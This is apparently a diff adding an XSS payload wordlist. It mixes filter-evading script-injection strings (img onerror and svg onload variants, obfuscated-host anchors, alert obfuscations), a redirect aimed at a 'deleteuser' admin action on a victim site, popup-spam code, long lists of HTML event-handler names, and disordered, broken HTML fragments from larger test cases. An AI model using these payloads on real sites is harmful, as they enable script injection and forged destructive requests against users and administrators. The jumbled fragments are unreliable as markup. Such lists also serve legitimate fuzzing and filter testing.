@@ -1,0 +1,200 @@
+Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser
+<A HREF="http://66.102.7.147/">XSS</A>
+<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>
+<A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>
+id="x">x</div>
+</div>
+function makePopups(){
+    for (i=1;i<6;i++) {
+        window.open('popup.html','spam'+i,'width=50,height=50');
+</body>
+<div id="123"><span class=foo>Some text</span>
+  id    ID    #REQUIRED>]>
+        </xsl:template>
+    <circle fill="red" r="40"></circle>
+Same effect with
+-->
+<math>
+<div id="131"><b>drag and drop one of the following strings to the drop box:</b>
+<br/><hr/>
+<br/><hr/>
+<br/><hr/>
+<br/><hr/>
+<br/><hr/>
+<label>type a,b,c,d - watch the network tab/traffic (JS is off, latest NoScript)</label>
+<br>
+<input name="secret" type="password">
+</image>
+<div id="134"><xmp>
+<%
+</xmp>
+x='<%'
+XXX
+-->{}
+</template>
+<input name="username" value="admin" />
+<input name="password" type="password" value="secret" />
+<input type="submit">
+<circle r="400"></circle>
+Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser
+<A HREF="http://66.102.7.147/">XSS</A>
+onBeforeActivate
+onBeforeCopy
+onBeforeCut
+onBeforeDeactivate
+onBeforeEditFocus
+onBeforePaste
+onBeforePrint
+onBeforeUnload
+onBeforeUpdate
+onBegin
+onBlur
+onBounce
+onCellChange
+onChange
+onClick
+onContextMenu
+onControlSelect
+onCopy
+onCut
+onDataAvailable
+onDataSetChanged
+onDataSetComplete
+onDblClick
+onDeactivate
+onDrag
+onDragDrop
+onDragEnd
+onDragEnter
+onError
+onErrorUpdate
+onFilterChange
+onFinish
+onFocus
+onFocusIn
+onFocusOut
+onHashChange
+onHelp
+onInput
+onKeyDown
+onKeyPress
+onKeyUp
+onLayoutComplete
+onLoad
+onLoseCapture
+onMediaComplete
+onMediaError
+onMessage
+onMouseDown
+onMouseEnter
+onMouseLeave
+onMouseMove
+onMouseOut
+onMouseOver
+onMouseUp
+onMouseWheel
+onMove
+onMoveEnd
+onMoveStart
+onOffline
+onOnline
+onOutOfSync
+onPaste
+onPause
+onPopState
+onProgress
+onPropertyChange
+onReadyStateChange
+onRedo
+onRepeat
+onReset
+onResize
+onResizeEnd
+onResizeStart
+onResume
+onReverse
+onRowDelete
+onRowExit
+onRowInserted
+onRowsEnter
+onScroll
+onSeek
+onSelect
+onSelectStart
+onSelectionChange
+onStart
+onStop
+onStorage
+onSubmit
+onSyncRestored
+onTimeError
+onTrackChange
+onURLFlip
+onUndo
+onUnload
+seekSegmentTime
+alert`1`
+alert&lpar;1&rpar;
+(alert)(1)
+a=alert,a(1)
+[1].find(alert)
+navigator.vibrate(500)
+<%78 onxxx=1
+<x %6Fnxxx=1
+<img src=x onerror=alert(String.fromCharCode(88,83,83));>
+<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
+<img src=x:alert(alt) onerror=eval(src) alt=xss>
+"><img src=x onerror=alert('XSS');>
+"><img src=x onerror=alert(String.fromCharCode(88,83,83));>
+<svgonload=alert(1)>
+<svg/onload=alert('XSS')>
+<svg/onload=alert(String.fromCharCode(88,83,83))>
+<svg id=alert(1) onload=eval(id)>
+onbounce
+oncanplay
+oncanplaythrough
+onchange
+onclick
+onclose
+oncontextmenu
+oncopy
+oncuechange
+oncut
+ondblclick
+ondrag
+ondragend
+ondragenter
+ondurationchange
+onend
+onended
+onerror
+onfinish
+onfocus
+onfocusin
+onfocusout
+onformdata
+onfullscreenchange
+onhashchange
+oninput
+oninvalid
+onkeydown
+onkeypress
+onkeyup
+onload
+onloadeddata
+onloadedmetadata
+onloadstart
+onmessage
+onmousedown
+onmouseenter
+onmouseleave
+onmousemove
+onmouseup
+onmousewheel
+onmozfullscreenchange
+onpagehide
+onpageshow
+onpaste
+onpause
+onplaying
+onpointerdown
